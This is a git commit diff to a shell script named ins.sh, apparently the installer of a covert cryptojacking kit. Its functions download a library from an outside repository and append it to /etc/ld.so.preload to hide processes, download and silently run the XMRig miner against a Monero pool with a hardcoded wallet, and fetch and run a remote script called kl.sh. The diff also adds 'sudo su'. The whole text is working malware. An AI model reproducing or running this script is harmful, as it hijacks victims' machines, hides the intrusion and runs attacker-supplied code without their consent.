1f206812faf964bc0f78f985d34a30e47acab493
drapo <136377959+m4rtis01@users.noreply.github.com>
2023-08-01 12:17:14 +0100

    Update ins.sh

--- ins.sh
+++ ins.sh
@@ -1,5 +1,5 @@
-
-function hider {
+sudo su
+function hider() {
     wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/libprhid.so ;
     mv libprhid.so /usr/local/lib/;
     echo /usr/local/lib/libprhid.so >> /etc/ld.so.preload ;
@@ -9,14 +9,14 @@ function hider {
     fi
 }
 
-function miner {
+function miner() {
     wget https://github.com/xmrig/xmrig/releases/download/v6.20.0/xmrig-6.20.0-linux-static-x64.tar.gz ;
     tar -xvf xmrig-6.20.0-linux-static-x64.tar.gz ;
     mv xmrig-6.20.0/xmrig xmrig-6.20.0/rig ;
     nohup xmrig-6.20.0/rig -a rx -o gulf.moneroocean.stream:10128 -u 41qn42wuAxjDb5Euccqitk7z7kWJ1ZSyCWkArNPexdyG4cC8wP3FRHGGgBxoFqYWktMvySUWLWg7ghzccooPKWgWQ3bt6Kr -p x &>/dev/null & disown -h %1
 }
 
-function killer {
+function killer() {
     wget https://raw.githubusercontent.com/m4rtis01/zarwel/main/kl.sh ;
     chmod +x kl.sh ;
     nohup ./kl.sh & disown -h %1
